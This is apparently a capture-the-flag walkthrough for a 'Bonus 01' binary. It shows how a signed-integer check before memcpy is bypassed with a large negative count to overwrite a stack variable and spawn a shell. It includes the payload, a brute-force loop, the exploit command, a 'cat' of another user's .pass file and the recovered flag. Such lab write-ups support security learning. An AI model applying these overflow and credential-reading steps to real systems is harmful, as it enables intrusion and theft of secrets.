# Bonus 01 Walkthrough

## Binary analysis

The binary takes two arguments: a number and a string. It converts the first argument to an integer (n), checks if n > 9, and then copies n*4 bytes from argv[2] to a stack buffer using memcpy. If n equals 0x574f4c46 (the magic value 'FLOW'), it spawns a shell.

### Key decompiled code
```c
int n = atoi(argv[1]);
if (n > 9) return 1;
    memcpy(&buffer, argv[2], n * 4);
if (n == 0x574f4c46)
    execl("/bin/sh", "sh", 0);
```

## Exploitation

- The check only prevents n > 9, but negative values are not handled. By passing a large negative value, we can copy more data than intended and overwrite the stack, including the variable n.
- We craft a payload that overwrites n with 0x574f4c46.

We calculate the offset between the dest of memcpy and the variable n, from the disassembly of main :

```
0x08048464 <+64>:	lea    0x14(%esp),%eax
0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
```

We craft the payload with the offset and the magic value:

```python
payload = b"A"*40 + b"\x57\x4f\x4c\x46"[::-1]
```

We want to memcpy 44 bytes (40 + 4) to the buffer, so we need to pass a negative value because n * 4 = 44 means n = 11, which is greater than 9, so not possible. With a negative value, we can pass a value that is not greater than 9 but once casted when memcpy is called, it will be greater than 9. With a simple -1, it segfaults.

We brute-force a working negative value:
```python
payload = b"A"*40 + b"\x57\x4f\x4c\x46"
for i in range(-2147483648, 10):
    os.system(f"./bonus1/bonus1 {i} {payload} 2>/dev/null && echo OK for {i}")
```

Working exploit:
```
./bonus1 -2147483635 "$(python -c 'print(b"A"*40 + b"\x57\x4f\x4c\x46"[::-1])')"
```

## Commands used

```
./bonus1 -2147483635 "$(python -c 'print(b"A"*40 + b"\x57\x4f\x4c\x46"[::-1])')"
cat /home/user/bonus2/.pass
```

## Result

After running the exploit, we get a shell as bonus2 and can read the password:

```
cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
 